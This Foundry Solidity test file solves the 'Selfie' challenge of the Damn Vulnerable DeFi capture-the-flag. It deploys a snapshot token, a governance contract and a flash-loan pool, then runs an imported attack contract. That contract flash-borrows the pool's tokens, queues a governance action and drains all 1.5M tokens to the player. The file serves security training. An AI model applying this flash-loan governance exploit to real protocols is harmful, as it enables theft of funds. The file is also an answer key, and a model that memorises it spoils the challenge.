// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/Test.sol";
import { DamnValuableTokenSnapshot } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableTokenSnapshot.sol";
import { SimpleGovernance, SelfiePool, SelfieHack } from "@contracts/CTF/Damn-Vulnerable-DeFi/06.Selfie.sol";

/*
    forge test --match-path foundry/test/CTF/Damn-Vulnerable-DeFi/06.Selfie.t.sol -vvvvv
*/

contract Challenge_6_Selfie_Test is Test {
    // hacking attack address
    address private deployer = address(1);
    address private feeRecipient = address(2);
    address private player = address(2333);

    uint256 private constant TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 private constant TOKENS_IN_POOL = 1_500_000 ether;

    DamnValuableTokenSnapshot private token;
    SimpleGovernance private governance;
    SelfiePool private pool;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, type(uint256).max);
        _before();
        vm.stopPrank();
        vm.startPrank(player);
    }

    function _before() public {
        /* SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));

        assertEq(governance.getActionCounter(), 1);

        pool = new SelfiePool(address(token), address(governance));

        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function test_Exploit() public {
        /* START CODE YOUR SOLUTION HERE */
        SelfieHack attacker = new SelfieHack(address(pool), address(governance), address(token));
        attacker.attack(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        attacker.executeAction();
        /* END CODE YOUR SOLUTION */
        vm.stopPrank();
        _after();
    }

    function _after() public {
        /* SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        vm.startPrank(deployer);
        assertEq(token.balanceOf(address(player)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
        vm.stopPrank();
    }
}
